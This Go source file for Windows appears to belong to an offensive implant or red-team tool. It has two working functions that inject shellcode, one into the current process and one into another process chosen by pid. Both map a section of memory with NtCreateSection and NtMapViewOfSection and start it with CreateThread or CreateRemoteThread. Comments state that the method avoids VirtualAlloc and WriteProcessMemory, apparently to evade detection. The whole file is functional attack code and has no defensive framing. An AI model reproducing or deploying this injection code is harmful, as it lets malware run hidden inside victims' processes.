//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	secCommit   uintptr = 0x8000000
	secNoChange uintptr = 0x0400000
	viewShare   uintptr = 1

	// NtCreateSection / NtMapViewOfSection NTSTATUS success
	statusSuccess uintptr = 0
)

// mapInjectLocal executes shellcode in the current process via a mapped section.
// No VirtualAlloc — uses NtCreateSection + NtMapViewOfSection.
func mapInjectLocal(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	sz := uintptr(len(shellcode))
	var hSection windows.Handle

	// NtCreateSection(§ion, SECTION_ALL_ACCESS, nil, &sz, PAGE_EXECUTE_READ_WRITE, SEC_COMMIT, nil)
	status, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0xF001F, // SECTION_ALL_ACCESS
		0,
		uintptr(unsafe.Pointer(&sz)),
		uintptr(pageExecuteReadWrite),
		secCommit,
		0,
	)
	if status != statusSuccess {
		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%X", status)
	}
	defer windows.CloseHandle(hSection)

	// Map writable view in local process
	var localBase uintptr
	var viewSz uintptr = uintptr(len(shellcode))
	status, _, _ = procNtMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(^uintptr(0)-1), // NtCurrentProcess pseudo handle
		uintptr(unsafe.Pointer(&localBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSz)),
		viewShare,
		0,
		uintptr(pageReadWrite),
	)
	if status != statusSuccess {
		return fmt.Errorf("NtMapViewOfSection(local): NTSTATUS 0x%X", status)
	}

	// Copy shellcode into the mapped view
	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
	copy(dst, shellcode)

	// Unmap writable view and remap RX (so the local mapping we execute from is RX)
	procNtUnmapViewOfSection.Call(uintptr(^uintptr(0)-1), localBase)

	var rxBase uintptr
	viewSz = uintptr(len(shellcode))
	status, _, _ = procNtMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(^uintptr(0)-1),
		uintptr(unsafe.Pointer(&rxBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSz)),
		viewShare,
		0,
		uintptr(pageExecRead),
	)
	if status != statusSuccess {
		return fmt.Errorf("NtMapViewOfSection(local RX): NTSTATUS 0x%X", status)
	}

	// Execute via CreateThread on the RX mapped region
	var tid uint32
	hThread, _, e := procCreateThread.Call(0, 0, rxBase, 0, 0, uintptr(unsafe.Pointer(&tid)))
	if hThread == 0 {
		return fmt.Errorf("CreateThread: %v", e)
	}
	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// mapInjectRemote injects shellcode into pid via cross-process NtMapViewOfSection.
// The section is created locally, written to, then mapped into the target process — no WriteProcessMemory.
func mapInjectRemote(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	sz := uintptr(len(shellcode))
	var hSection windows.Handle

	status, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0xF001F,
		0,
		uintptr(unsafe.Pointer(&sz)),
		uintptr(pageExecuteReadWrite),
		secCommit,
		0,
	)
	if status != statusSuccess {
		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%X", status)
	}
	defer windows.CloseHandle(hSection)

	// Map writable view locally to write shellcode
	var localBase uintptr
	var viewSz uintptr = uintptr(len(shellcode))
	status, _, _ = procNtMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(^uintptr(0)-1),
		uintptr(unsafe.Pointer(&localBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSz)),
		viewShare,
		0,
		uintptr(pageReadWrite),
	)
	if status != statusSuccess {
		return fmt.Errorf("NtMapViewOfSection(local): NTSTATUS 0x%X", status)
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
	copy(dst, shellcode)

	procNtUnmapViewOfSection.Call(uintptr(^uintptr(0)-1), localBase)

	// Open target process
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Map RX view into remote process
	var remoteBase uintptr
	viewSz = uintptr(len(shellcode))
	status, _, _ = procNtMapViewOfSection.Call(
		uintptr(hSection),
		uintptr(hProc),
		uintptr(unsafe.Pointer(&remoteBase)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSz)),
		viewShare,
		0,
		uintptr(pageExecRead),
	)
	if status != statusSuccess {
		return fmt.Errorf("NtMapViewOfSection(remote): NTSTATUS 0x%X", status)
	}

	// Kick off execution in remote process via CreateRemoteThread
	var tid uint32
	hThread, _, e := procCreateRemoteThread.Call(
		uintptr(hProc), 0, 0, remoteBase, 0, 0,
		uintptr(unsafe.Pointer(&tid)),
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread: %v", e)
	}
	windows.CloseHandle(windows.Handle(hThread))
	return nil
}
